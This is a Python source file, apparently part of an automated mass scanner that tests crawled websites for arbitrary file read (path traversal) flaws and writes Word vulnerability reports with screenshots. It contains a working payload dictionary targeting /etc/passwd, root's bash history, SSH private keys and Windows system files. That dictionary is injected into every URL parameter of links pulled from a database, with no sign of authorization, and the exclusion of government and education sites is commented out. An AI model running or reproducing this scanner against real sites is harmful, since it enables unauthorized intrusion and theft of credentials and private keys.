# coding:utf-8
from string import whitespace
import urllib
import requests
requests.packages.urllib3.disable_warnings()
import re
from urllib.parse import urlparse,urlencode,parse_qs,parse_qsl,quote_plus
from urllib.request import urlopen
import mechanize
import http.client
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
import random
import sys
import os
import time
from docx import Document
from docx.shared import Pt
from docx.shared import RGBColor
from docx.oxml.ns import qn
from docx.shared import Inches
import multiprocessing
import re
import random
import datetime
import requests
from concurrent.futures import ProcessPoolExecutor
from selenium import webdriver
from selenium.webdriver.support import expected_conditions as EC
from PIL import ImageGrab
# 输入屏幕左上角和右下角的坐标
from urllib.parse import urlparse
import contextlib
import configparser
import pymysql
from urllib.parse import urlparse,parse_qs,parse_qsl,urlencode,urljoin
import copy
import requests
import threading
lock1 = threading.Lock()
lock2 = threading.Lock()

cfg = configparser.ConfigParser()
cfg.read('../Config.ini')
user = cfg.get("Server", "username")
passwd = cfg.get("Server", "password")
host = cfg.get("Server", "host")
Dbname = cfg.get("Server", "db")
port = int(cfg.get("Server", "port"))

thread_s = int(cfg.get("Common_Config", "threads"))
scan_level_s = int(cfg.get("Scan_Levels", "Scan_Level"))
# def # o_y():
#     yea = datetime.datetime.now().year
#     if yea == 2020:
#         sys.exit()
#
# def # o_l():
#     try:
#         r = requests.get('http://www.langzi.fun/on.txt',timeout=5)
#         if b'off' in r.content:
#             sys.exit()
#     except Exception as e:
#         print(e)




from urllib.parse import urlparse,parse_qs,parse_qsl,urlencode,urljoin
import copy
import requests
payloads = {
    '../../../../../../../../../etc/hosts':'localhost localhost.localdomain',
    '../../etc/hosts':'localhost localhost.localdomain',
    '/etc/hosts':'localhost localhost.localdomain',
    '../../../../../../../../../etc/passwd':'root:x:',
    '../../../etc/pwd/././.[…]/././.':'root:x:',
    '/etc/passwd.txt/../../etc/passwd':'root:x:',
    '../../root/.bash_history':'cd ./usr/local/nginx',
    '../root/.bash_history':'cat /etc/my.cnf ',
    '/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd':'root:x:',
    'WEB-INF/password.xml':'viewfile/?contextpath=/',
    '../../ierp/bin/prop.xml':'sendStringParametersAsUnicode=',
    '/.ssh/id_dsa': 'PRIVATE KEY-',
    '../../../../../../ssh/id_dsa': 'PRIVATE KEY-',
    '/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd': 'root:x:',
    'C:/Windows/System32/drivers/etc/hosts': 'localhost localhost.localdomain',
    '/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/windows/win.ini': '[mci extensions]'}

@contextlib.contextmanager
def connect_mysql():
    coon = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname, port=port, charset='utf8')
    cursor = coon.cursor()
    try:
        yield cursor
    except Exception as e:
        print(e)
        pass
    finally:
        coon.commit()
        cursor.close()
        coon.close()


REFERERS = [
    "https://www.baidu.com",
    "http://www.baidu.com",
    "https://www.google.com.hk",
    "http://www.so.com",
    "http://www.sogou.com",
    "http://www.soso.com",
    "http://www.bing.com",
]

headerss = [
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1",
    "Mozilla/5.0 (X11; CrOS i686 2268.111.0) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6",
    "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/19.77.34.5 Safari/537.1",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
    "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
    "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.0 Safari/536.3",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24",
    "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24"]

headers = {
    'User-Agent': random.choice(headerss),
    'Accept': 'Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Cache-Control': 'max-age=0',
    'referer': random.choice(REFERERS),
    'Accept-Charset': 'GBK,utf-8;q=0.7,*;q=0.3',
}

headerss = [
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1",
    "Mozilla/5.0 (X11; CrOS i686 2268.111.0) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6",
    "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/19.77.34.5 Safari/537.1",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
    "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
    "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.0 Safari/536.3",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24",
    "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24"]

def writedata(x):
    with open('log.txt', 'a+')as aa:
        aa.write('***********************************' + '\n')
        aa.write(str(time.strftime('%Y-%m-%d:%H:%M:%S   ', time.localtime())) + str(x) + '\n')


class Get_Info:
    def __init__(self,url):
        self.url=url
        self.title_parrten = 'class="w61-0"><div class="ball">(.*?)</div></td>'  # group(1) 正常
        self.ip_parrten = '>IP：(.*?)</a></div>'  # group(1) 正常
        self.ages = '" target="_blank">(.*?)</a></div></div>'  # group(1)
        self.whois_id = '备案号：</span><a href=.*?" target="_blank">(.*?)</a></div>'  # 需group(1)
        self.whois_type = '<span>性质：</span><strong>(.*?)</strong></div>'  # 需group(1)
        self.whois_name = '<span>名称：</span><strong>(.*?)</strong></div>'  # 需group(1)
        self.whois_time = '<span>审核时间：</span><strong>(.*?)</strong></div>'  # 需group(1)
        self.include_baidu = '<div class="Ma01LiRow w12-1 ">(.*?)</div>'  # group(1)
        self.infos = '<div class="MaLi03Row w180">(.*?)</div>'  # 要findall 0，1，2，3
        self.result={'百度权重':'',
                    '网站主页':'',
                     '网站描述':'',
                   '网站标题':'',
                   'IP__坐标':'',
                   '所属__IP':'',
                   '网站年龄':'',
                   '备案编号':'',
                   '备案性质':'',
                   '备案名称':'',
                   '备案时间':'',
                   '百度收录':'',
                   '协议类型':'',
                   '页面类型':'',
                   '服务类型':'',
                   '程序语言':''}

    def get_baidu_weight(self):
        # o_l()
        time.sleep(random.randint(1, 5))
        x = str(random.randint(1, 9))
        data = {
            't': 'rankall',
            'on': 1,
            'type': 'baidupc',
            'callback': 'jQuery111303146901980779846_154444474116%s' % (x),
            'host': self.url
        }

        headers = {

            'Accept': 'text/javascript, application/javascript, application/ecmascript, application/x-ecmascript, */*; q=0.01',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.9',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Cookie': 'UM_distinctid=165af67ee6f352-07238a34ed3941-9393265-1fa400-165af67ee70473; CNZZDATA5082706=cnzz_eid%3D832961605-1544438317-null%26ntime%3D1544443717; Hm_lvt_aecc9715b0f5d5f7f34fba48a3c511d6=1544443985; Hm_lpvt_aecc9715b0f5d5f7f34fba48a3c511d6=1544443985; qHistory=aHR0cDovL3JhbmsuY2hpbmF6LmNvbS9iYWlkdW1vYmlsZS8r55m+5bqm56e75Yqo5p2D6YeNfGh0dHA6Ly9yYW5rLmNoaW5hei5jb20vcmFua2FsbC8r5p2D6YeN57u85ZCI5p+l6K+ifGh0dHA6Ly9yYW5rLmNoaW5hei5jb20r55m+5bqm5p2D6YeN5p+l6K+ifGh0dHA6Ly9pbmRleC5jaGluYXouY29tLyvlhbPplK7or43lhajnvZHmjIfmlbB8aHR0cDovL3JhbmsuY2hpbmF6LmNvbS9yYW5rL2hpc3RvcnkuYXNweCvmnYPph43ljoblj7Lmn6Xor6I=',
            'Host': 'rank.chinaz.com',
            'Origin': 'http://rank.chinaz.com',
            'Referer': 'http://rank.chinaz.com',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest'

        }
        try:
            urls = 'http://rank.chinaz.com/ajaxseo.aspx?t=rankall&on=1&type=undefined&callback=jQuery111303146901980779846_154444474116%s' % (
                x)

            r = requests.post(url=urls, headers=headers, data=data)
            try:
                res = re.search(b',"br":(\d),"beforBr', r.content).group(1)
            except:
                pass
            if res:
                return res.decode()
            else:
                return '0'
        except:
            return '获取失败'


    def get_info_from_pattren(self,pattren, result):
        try:
            res = re.search(pattren, result).group(1)
            return res
        # return str(res.encode('utf-8'))
        except:
            return '暂无信息'

    def scan_seo(self):
        # o_l()
        UA = random.choice(headerss)
        headers = {'User-Agent': UA}
        domain_url = self.url.replace('https://', '').replace('http://', '').replace('www.', '').split('/')[0]
        urls = 'http://seo.chinaz.com/' + domain_url
        # url,title,weights,ip,ages,whois_id,whois_type,whois_name,whois_time
        # 网址，标题，百度权重，ip信息，年龄，备案号，备案性质，备案名称，备案时间
        # include_baidu,request,text,service,language
        # 百度收录，，协议类型，页面类型，服务器类型，程序语言
        try:
            req = requests.get(urls, headers, verify=False, timeout=20)
            encoding = requests.utils.get_encodings_from_content(req.text)[0]
            r = req.content.decode(encoding, 'replace')
        except Exception as e:
            writedata(str(e))

        try:
            req = requests.get(self.url, headers, verify=False, timeout=20)
            encoding = requests.utils.get_encodings_from_content(req.text)[0]
            rss = req.content.decode(encoding, 'replace')
        except Exception as e:
            writedata(str(e))


        self.result['网站描述'] = '暂无信息'
        try:
            description = re.search('description.*?content=(.*?)>',rss,re.S).group(1)
            self.result['网站描述'] = description.strip()
        except:
            pass

        self.result['百度权重'] = str(self.get_baidu_weight())

        self.result['网站主页'] = self.url.split('//')[0] + '//' + self.url.split('//')[1].split('/')[0]

        try:
            req1 = requests.get(url=self.url, headers=headers, verify=False, timeout=10)
            encoding = requests.utils.get_encodings_from_content(req1.text)[0]
            rress = req1.content.decode(encoding, 'replace')
            title_pattern = '<title>(.*?)</title>'
            title = re.search(title_pattern, rress, re.S | re.I)
            self.result['网站标题'] = str(title.group(1))
        except:
            self.result['网站标题'] = self.url.split('//')[0] + '//' + self.url.split('//')[1].split('/')[0]


        ip_infos = self.get_info_from_pattren(self.ip_parrten, r)
        if '[' in ip_infos:
            ip, address = ip_infos.split('[')[0], ip_infos.split('[')[1]
            self.result['IP__坐标'] = address.replace(']', '')
            self.result['所属__IP'] = ip
        else:
            self.result['IP__坐标'] = '获取失败'
            self.result['所属__IP'] = '获取失败'

        self.result['网站年龄'] = self.get_info_from_pattren(self.ages, r)
        self.result['备案编号'] = self.get_info_from_pattren(self.whois_id, r)
        self.result['备案性质'] = self.get_info_from_pattren(self.whois_type, r)
        self.result['备案名称'] = self.get_info_from_pattren(self.whois_name, r)
        self.result['备案时间'] = self.get_info_from_pattren(self.whois_time, r)
        self.result['百度收录'] = self.get_info_from_pattren(self.include_baidu, r)

        dd = re.findall(self.infos, r, re.S)
        resu = ['暂无信息' if x.replace(' ', '') is '' else x for x in dd]
        try:
            self.result['协议类型'] = resu[0]
        except:
            self.result['协议类型'] = '获取失败'

        try:
            self.result['页面类型'] = resu[1]
        except:
            self.result['页面类型'] = '获取失败'

        try:
            self.result['服务类型'] = resu[2]
        except:
            self.result['服务类型'] = '获取失败'

        try:
            self.result['程序语言'] = resu[3]
        except:
            self.result['程序语言'] = '获取失败'
        return self.result


def get_image(jpg):
    time.sleep(10)
    pic = ImageGrab.grab(bbox=(20, 31, 1266, 1016))
    # 指定坐标 左上角和右下角
    # pic = ImageGrab.grab()
    # 全屏截图
    pic.save(jpg)




def run(url):
    lock1.release()
    profile = webdriver.FirefoxProfile()
    profile.accept_untrusted_certs = True
    driver = webdriver.Firefox(firefox_profile=profile)
    driver.set_page_load_timeout(20)
    try:
        driver.get(url)
    except:
        pass
    lock2.release()
    time.sleep(15)
    try:
        driver.close()
    except Exception as e:
        print(e)

    finally:
        # driver.quit()
        return True

def main(url):
    # o_l()
    print('Check : {}'.format(url))
    domain = urlparse(url).netloc

    try:
        filename = url.split('//')[1].split('/')[0].replace(':', '_').replace('/', '_') + '__页面存在任意文件读取漏洞.docx'
        jpg = 'image/'+url.split('//')[1].split('/')[0].replace(':', '_').replace('/', '_') + '.png'
    except:
        pass
    try:
        filename = domain.replace(':', '_').replace('/', '_') + '__页面存在任意文件读取漏洞.docx'
        jpg = 'image/' + domain.replace(':', '_').replace('/', '_') + '.png'
    except:
        pass

    finally:
        filename = filename.replace('__', '_' + str(random.randint(1, 2000)) + '_')
        filename = '../result/' + filename


    t1 = threading.Thread(target=run,args=(url,))
    t2 = threading.Thread(target=get_image,args=(jpg,))
    lock1.acquire()
    lock2.acquire()
    t1.start()
    t2.start()
    t1.join()
    t2.join()
    print('开始保存文档....')

    if url:
        # o_l()
        document = Document(docx=os.path.join(os.getcwd(), 'default.docx'))
        DaHei = document.styles.add_style('DaHei', 1)
        # 设置字体尺寸
        DaHei.font.size = Pt(16)
        # 设置字体颜色
        DaHei.font.color.rgb = RGBColor(0, 0, 0)
        # 黑色
        # UserStyle1.font.color.rgb = RGBColor(0xff, 0xde, 0x00)
        # 居中文本
        DaHei.font.name = '仿宋'
        DaHei._element.rPr.rFonts.set(qn('w:eastAsia'), '仿宋')

        ZhongHei = document.styles.add_style('ZhongHei', 1)
        # 设置字体尺寸
        ZhongHei.font.size = Pt(10)
        # 设置字体颜色
        ZhongHei.font.color.rgb = RGBColor(0, 0, 0)
        # 黑色
        # UserStyle1.font.color.rgb = RGBColor(0xff, 0xde, 0x00)
        # 居中文本
        ZhongHei.font.name = '仿宋'
        ZhongHei._element.rPr.rFonts.set(qn('w:eastAsia'), '仿宋')

        ZhongHOng = document.styles.add_style('ZhongHOng', 1)
        # 设置字体尺寸
        ZhongHOng.font.size = Pt(9)
        # 设置字体颜色
        ZhongHOng.font.color.rgb = RGBColor(178, 34, 34)
        # 红色
        # UserStyle1.font.color.rgb = RGBColor(0xff, 0xde, 0x00)
        # 居中文本
        ZhongHOng.font.name = '仿宋'
        ZhongHOng._element.rPr.rFonts.set(qn('w:eastAsia'), '仿宋')

        XiaoLv = document.styles.add_style('XiaoLv', 1)
        # 设置字体尺寸
        XiaoLv.font.size = Pt(6.5)
        # 设置字体颜色
        XiaoLv.font.color.rgb = RGBColor(0, 255, 0)
        # 绿色
        # UserStyle1.font.color.rgb = RGBColor(0xff, 0xde, 0x00)
        # 居中文本
        XiaoLv.font.name = '仿宋'
        XiaoLv._element.rPr.rFonts.set(qn('w:eastAsia'), '仿宋')

        document.add_paragraph('基本信息', 'Title')
        document.add_paragraph('漏洞类型：任意文件读取漏洞', 'Subtitle')
        document.add_paragraph('漏洞等级：高危', 'Subtitle')
        document.add_paragraph('厂商信息：此处需要手动搜索', 'Subtitle')
        document.add_page_break()

        document.add_paragraph('漏洞简述', 'Title')
        document.add_paragraph('漏洞描述', 'Subtitle')
        document.add_paragraph('任意文件读取是属于文件操作漏洞的一种，一般任意文件读取漏洞可以读取的配置信息甚至系统重要文件。', 'DaHei')
        document.add_paragraph('漏洞危害', 'Subtitle')
        document.add_paragraph(
           '''
        1 可以任意读取服务器上部分或者全部文件的漏洞，攻击者利用此漏洞可以读取服务器敏感文件
        2 漏洞一般存在于文件下载参数，文件包含参数。主要是由于程序对传入的文件名或者文件路径没有经过合理的校验，从而操作了预想之外的文件，导致意外的文件泄露。
        
           ''','DaHei')

        document.add_page_break()

        document.add_paragraph('漏洞详情', 'Title')
        document.add_paragraph('网站漏洞报表', 'Subtitle')
        document.add_paragraph('漏洞网址:'+url,'ZhongHei')

        document.add_page_break()
        urls = url.split('//')[0] + '//' + url.split('//')[1].split('/')[0]
        try:
            document.add_paragraph('网站信息报表', 'Subtitle')
            info = Get_Info(urls)
            infos = info.scan_seo()
            for k,v in infos.items():
                document.add_paragraph(k+'  '+v,'ZhongHei')
            document.add_page_break()
        except Exception as e:
            writedata(str(e))


        document.add_paragraph('网站漏洞复现(使用Firefox浏览器)', 'Subtitle')
        document.add_paragraph('访问链接','DaHei')
        document.add_paragraph(url,'ZhongHOng')
        document.add_paragraph('返回结果','DaHei')
        document.add_picture(jpg,width=Inches(7))
        document.add_paragraph('复现完成，验证存在任意文件读取漏洞','DaHei')

        document.add_page_break()
        document.add_paragraph('修复建议', 'Title')
        document.add_paragraph('代码原理防护', 'Subtitle')
        document.add_paragraph('''
            1 软件设计初期就做好相关业务功能的安全设计，做好防范任意文件读取漏洞的安全设计。
            2 在编码中能很好的实现，在测试阶段能做好web软件系统的安全测试工作，这样就能尽可能的避免web应用上线后出现任意文件读取的漏洞。
            3 从编码角度而言，只要对传入的文件名做白名单限制，并且对传入的文件路径做好过滤，禁止传入.(点好)等通道符。
            对于php语言，也要做好目录的访问权限，如在php.ini配置open_basedir限定文件访问范围。对文件的下载做好独立的目录，并采用文件id的方式对文件进行标记。
        ''','DaHei')
        try:
            section = document.sections[0]
            header = section.header
            paragraph = header.paragraphs[0]
            paragraph.text = "Report_Powered_By_Langzi"
        except:
            pass
        document.save(filename)
        return 'XSS'



def scan_get(url,payload,headers):

    # print('[{}] Scan {} '.format(str(datetime.datetime.now()).split('.')[0],url))
    # print('传入URL为 : '+url)
    # print('检测PAYLOAD为 : '+payload)
    try:
        r = requests.get(url,headers=headers,timeout=10,verify=False)
        if payload.encode() in r.content:
            print('存在任意文件读取!!!')
            with open('lfi_result.txt','a+')as a:
                a.write(url + '\n')
            main(url)
            return 'URL'
    except Exception as e:
        #print(e)
        pass


def Get_Paylpad(url):
    # o_l()
    try:
        site = url
        finalurl = urlparse(site)
        domain0 = '{uri.scheme}://{uri.netloc}/'.format(uri=finalurl)
        # http://127.0.0.1/
        domain = domain0.replace("https://", "").replace("http://", "").replace("www.", "").replace("/", "")
        # 127.0.0.1
        o = urlparse(site)
        parameters = parse_qs(o.query, keep_blank_values=True)
        # {'url': ['i'], 'id': ['1']}
        path = urlparse(site).scheme + "://" + urlparse(site).netloc + urlparse(
            site).path
        # http://127.0.0.1/pik/vul/urlredirect/urlredirect.php

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'zh,zh-CN;q=0.9,en-US;q=0.8,en;q=0.7',
            'Cache-Control': 'max-age=0',
            'Connection': 'close',
            'Host': '{0}',
            'Referer': '{1}',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36'
        }
        headers = {k: v.format(domain,domain0) for k, v in headers.items()}
        paramvlue = {k:v[0] for k,v in parameters.items()}
        for payload in payloads:
            payload = payload.format(domain0)
            for k,v in paramvlue.items():
                paramvlues = copy.deepcopy(paramvlue)
                paramvlues[k] = payload
                dix = scan_get(path+'?' + urlencode(paramvlues),payloads[payload],headers)
                # print('传入URL为 : '+path+'?' + urlencode(paramvlues))
                # print('检测到PAYLOAD为 : '+payloads[payload])
                if dix:
                    return dix
    except Exception as e:
        writedata(str(e))

def get_xss(sem,scan_level_s):
    time.sleep(random.randint(1,15))
    while 1:
        if scan_level_s == 1 or scan_level_s == 3:
            sem.acquire()
            with connect_mysql() as conn:
                sql1 = 'select links from Sec_Links_1 where lfi=0 limit 1'
                sql2 = 'update Sec_Links_1 set lfi=1 where lfi=0 limit 1'
                conn.execute(sql1)
                res = conn.fetchone()
                if res == None:
                    sem.release()
                    return
                else:
                    Url_Links = []
                    try:
                        Url_Links = eval(res[0])
                    except:
                        pass
                conn.execute(sql2)
                sem.release()
            if Url_Links:
                for i in Url_Links:
                    # if '.gov.cn' not in i and '.edu.cn' not in i:

                        print(i)
                        res1 = Get_Paylpad(i)
                        if res1:
                            break

        if scan_level_s == 2 or scan_level_s == 3:
            sem.acquire()
            with connect_mysql() as conn:
                sql1 = 'select links from Sec_Links_2 where lfi=0 limit 1'
                sql2 = 'update Sec_Links_2 set lfi=1 where lfi=0 limit 1'
                conn.execute(sql1)
                res = conn.fetchone()
                if res == None:
                    sem.release()
                    return
                else:
                    Url_Links = []
                    try:
                        Url_Links = eval(res[0])
                    except:
                        pass
                conn.execute(sql2)
                sem.release()
            if Url_Links:
                for i in Url_Links:
                    #if '.gov.cn' not in i and '.edu.cn' not in i:

                        print(i)
                        res1 = Get_Paylpad(i)
                        if res1:
                            break


def test_start():
    with connect_mysql() as conn:
        if scan_level_s == 1 or scan_level_s == 3:
            sql1 = 'select count(id) from Sec_Links_1 where lfi=0'
            conn.execute(sql1)
            res = conn.fetchone()
            if res == None:
                print('数据库暂时无超链接数据可提取，自动等待开启')
                time.sleep(180)
            else:
                cou = int(res[0])
                if cou > thread_s*2:
                    return True
                else:
                    time.sleep(60)

        if scan_level_s == 2 or scan_level_s == 3:
            sql1 = 'select count(id) from Sec_Links_2 where lfi=0'
            conn.execute(sql1)
            res = conn.fetchone()
            if res == None:
                print('数据库暂时无超链接数据可提取，自动等待开启')
                time.sleep(180)
            else:
                cou = int(res[0])
                if cou > thread_s*2:
                    return True
                else:
                    time.sleep(60)

if __name__ == '__main__':
    multiprocessing.freeze_support()
    # o_y()
    sem = multiprocessing.Manager().BoundedSemaphore(1)

    if os.path.exists('result'):
        pass
    else:
        os.mkdir('result')
    if os.path.exists('image'):
        pass
    else:
        os.mkdir('image')

    t_start = test_start()
    if not t_start:
        time.sleep(160)

    t_start = test_start()
    if not t_start:
        time.sleep(160)

    t_start = test_start()
    if not t_start:
        time.sleep(160)

    t_start = test_start()
    if not t_start:
        time.sleep(160)

    t_start = test_start()
    if not t_start:
        time.sleep(160)

    t_start = test_start()
    if not t_start:
        time.sleep(160)

    t_start = test_start()
    if not t_start:
        time.sleep(160)
    t_start = test_start()
    if not t_start:
        time.sleep(160)

    t_start = test_start()
    if not t_start:
        time.sleep(160)

    t_start = test_start()
    if not t_start:
        time.sleep(160)

    t_start = test_start()
    if not t_start:
        time.sleep(160)
    t_start = test_start()
    if not t_start:
        time.sleep(160)
    t_start = test_start()
    if not t_start:
        time.sleep(160)
    t_start = test_start()
    if not t_start:
        time.sleep(160)
    t_start = test_start()
    if not t_start:
        time.sleep(160)
    t_start = test_start()
    if not t_start:
        time.sleep(160)
    t_start = test_start()
    if not t_start:
        time.sleep(160)
    t_start = test_start()
    if not t_start:
        time.sleep(160)
    t_start = test_start()
    if not t_start:
        time.sleep(160)
    t_start = test_start()
    if not t_start:
        time.sleep(160)
    t_start = test_start()
    if not t_start:
        time.sleep(160)

    t_start = test_start()
    if not t_start:
        time.sleep(160)

    t_start = test_start()
    if not t_start:
        time.sleep(160)

    t_start = test_start()
    if not t_start:
        time.sleep(60)

    t_start = test_start()
    if not t_start:
        time.sleep(60)

    t_start = test_start()
    if not t_start:
        time.sleep(60)

    t_start = test_start()
    if not t_start:
        time.sleep(60)

    t_start = test_start()
    if not t_start:
        time.sleep(60)

    t_start = test_start()
    if not t_start:
        time.sleep(60)

    t_start = test_start()
    if not t_start:
        time.sleep(60)
    t_start = test_start()
    if not t_start:
        time.sleep(60)

    t_start = test_start()
    if not t_start:
        time.sleep(60)

    t_start = test_start()
    if not t_start:
        time.sleep(60)

    t_start = test_start()
    if not t_start:
        time.sleep(60)

    t_start = test_start()
    if not t_start:
        time.sleep(60)

    t_start = test_start()
    if not t_start:
        time.sleep(60)

    t_start = test_start()
    if not t_start:
        time.sleep(60)

    t_start = test_start()
    if not t_start:
        print('数据库无超链接数据或数据库超链接数据小于{}'.format(thread_s * 2))
        sys.exit()

    pool = multiprocessing.Pool()
    for i in range(thread_s):
        pool.apply_async(func=get_xss, args=(sem,scan_level_s))
    pool.close()
    pool.join()
    import sys
    sys.exit()

